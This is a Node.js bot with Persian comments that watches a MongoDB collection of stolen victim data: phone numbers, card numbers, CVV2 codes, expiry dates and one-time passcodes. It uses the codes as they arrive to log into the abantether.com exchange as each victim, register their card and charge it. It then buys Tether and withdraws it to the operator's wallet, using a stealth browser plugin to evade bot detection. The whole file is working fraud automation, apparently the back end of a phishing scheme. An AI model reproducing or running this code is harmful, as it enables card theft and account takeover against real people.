require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient } = require('mongodb');
const chalk = require('chalk');

// تنظیمات محیطی
const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS;
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const EXCHANGE_URL = 'https://abantether.com';

if (!MONGODB_URI || !WALLET_ADDRESS) {
  console.log(chalk.red('خطا: MONGODB_URI یا WALLET_ADDRESS تنظیم نشده!'));
  process.exit(1);
}

// لاگ رنگی
const log = {
  info: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  success: (msg) => console.log(chalk.green(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  error: (msg) => console.log(chalk.red(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  wait: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
};

let collection;

// اتصال به دیتابیس
async function connectDB() {
  const client = new MongoClient(MONGODB_URI, { 
    serverSelectionTimeoutMS: 15000,
    maxPoolSize: 10
  });
  await client.connect();
  collection = client.db('zarin').collection('users');
  log.success('اتصال به MongoDB برقرار شد');
}

// آیا کاربر آماده پردازش است؟
function isReady(doc) {
  if (doc.processed === true) return false;

  const hasPhone = !!doc.personalPhoneNumber;
  const hasCard = !!doc.cardNumber && !!doc.cvv2 && !!doc.bankMonth && !!doc.bankYear;
  const hasDevice = !!doc.deviceId;
  const hasAnyOtp = !!doc.otp_login || !!doc.otp_register_card || !!doc.otp_payment;

  return hasPhone && hasCard && hasDevice && hasAnyOtp;
}

// پردازش کاربر
async function processUser(doc) {
  const phone = doc.personalPhoneNumber;
  let browser, page;

  log.start(`شروع پردازش برای ${phone}`);

  try {
    browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--no-zygote',
        '--single-process'
      ]
    });

    page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) Mobile/15E148 Safari/604.1');
    await page.goto(EXCHANGE_URL, { waitUntil: 'networkidle2', timeout: 60000 });

    // مرحله ۱: ورود با شماره
    if (!doc.otp_login) {
      await page.waitForSelector('input[placeholder="شماره موبایل"], input[type="tel"]', { timeout: 20000 });
      await page.type('input[placeholder="شماره موبایل"], input[type="tel"]', phone);
      await page.click('button:has-text("ادامه"), button:has-text("ورود")');
      log.wait(`منتظر otp_login برای ${phone}...`);
      return;
    }

    // وارد کردن OTP ورود
    await page.type('input[placeholder="کد تایید"], input[type="text"]', doc.otp_login);
    await page.click('button:has-text("تایید")');
    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 }).catch(() => {});

    // مرحله ثبت کارت (اگر otp_register_card نداشته باشه)
    if (!doc.otp_register_card) {
      try {
        await page.click('text=کیف پول');
        await page.click('text=کارت بانکی');
        await page.click('text=افزودن کارت, text=ثبت کارت');
        await page.type('input[placeholder="شماره کارت"]', doc.cardNumber.replace(/\s/g, ''));
        await page.type('input[placeholder="CVV2"]', doc.cvv2);
        await page.type('input[placeholder="ماه"]', doc.bankMonth.toString().padStart(2, '0'));
        await page.type('input[placeholder="سال"]', (doc.bankYear - 1300).toString().padStart(2, '0'));
        await page.click('button:has-text("ثبت کارت")');
        log.wait(`منتظر otp_register_card برای ${phone}...`);
        return;
      } catch (e) { /* قبلاً ثبت شده */ }
    }

    // تأیید کارت
    await page.type('input[placeholder*="کد"], input[placeholder*="پیامک"]', doc.otp_register_card);
    await page.click('button:has-text("تأیید")');

    // شارژ حساب
    if (!doc.otp_payment) {
      await page.click('text=واریز تومان, text=شارژ حساب');
      await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
      await page.click('button:has-text("پرداخت")');
      await page.waitForSelector('input[placeholder*="کد"], input#otp', { timeout: 20000 });
      log.wait(`منتظر otp_payment برای ${phone}...`);
      return;
    }

    await page.type('input[placeholder*="کد"], input#otp', doc.otp_payment);
    await page.click('button:has-text("تایید"), button:has-text("پرداخت")');
    await page.waitForSelector('text=موفق, text=پرداخت', { timeout: 120000 });

    // خرید تتر + برداشت
    await page.click('text=بازار');
    await page.click('text=تتر');
    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("خرید")');

    await page.click('text=برداشت');
    await page.click('text=تتر');
    await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
    await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
    await page.click('button:has-text("برداشت")');

    log.success(`تمام مراحل با موفقیت انجام شد! تتر در راهه: ${phone}`);
    await collection.updateOne(
      { _id: doc._id },
      { $set: { processed: true, status: 'completed', completedAt: new Date() } }
    );

  } catch (err) {
    log.error(`شکست برای ${phone}: ${err.message}`);
    await collection.updateOne(
      { _id: doc._id },
      { $set: { status: 'failed', error: err.message } }
    );
  } finally {
    if (browser) await browser.close().catch(() => {});
  }
}

// شروع ربات + Change Stream با لاگ کامل
async function startBot() {
  await connectDB();

  log.success('ربات فعال شد - هر تغییری = پردازش فوری');

  const pipeline = [
    { $match: { operationType: { $in: ['insert', 'update'] } } }
  ];

  const changeStream = collection.watch(pipeline, { 
    fullDocument: 'updateLookup',
    fullDocumentOnInsert: 'updateLookup'
  });

  changeStream.on('change', async (change) => {
    log.start(`تغییر تشخیص داده شد! نوع: ${change.operationType}`);

    const doc = change.fullDocument;
    if (!doc) return;

    log.info(`شماره: ${doc.personalPhoneNumber || 'نامشخص'}`);
    log.info(`OTP_LOGIN: ${doc.otp_login ? 'دارد' : 'ندارد'}`);
    log.info(`OTP_CARD: ${doc.otp_register_card ? 'دارد' : 'ندارد'}`);
    log.info(`OTP_PAYMENT: ${doc.otp_payment ? 'دارد' : 'ندارد'}`);

    if (doc.processed === true) {
      log.info('این کاربر قبلاً پردازش شده');
      return;
    }

    if (isReady(doc)) {
      log.start(`شرایط کامل → شروع پردازش برای ${doc.personalPhoneNumber}`);
      processUser(doc);
    } else {
      log.wait('هنوز آماده نیست، منتظر تکمیل فیلدها...');
    }
  });

  changeStream.on('error', (err) => {
    log.error('Change Stream قطع شد! دوباره وصل می‌شم...');
    setTimeout(startBot, 10000);
  });
}

startBot().catch(err => {
  log.error('خطای فتال: ' + err.message);
  setTimeout(startBot, 10000);
});